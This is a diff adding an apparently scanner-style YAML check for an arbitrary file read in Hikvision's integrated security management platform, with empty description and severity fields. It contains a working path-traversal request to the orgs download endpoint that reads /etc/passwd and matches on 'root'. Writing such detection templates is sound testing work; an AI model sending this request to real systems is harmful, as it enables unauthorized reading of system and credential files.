@@ -1,0 +1,15 @@
+id:
+info:
+  name: 海康威视综合安防管理平台download任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd
+response1:
+  body: root
+  code: 200
+requests2:
+response2:
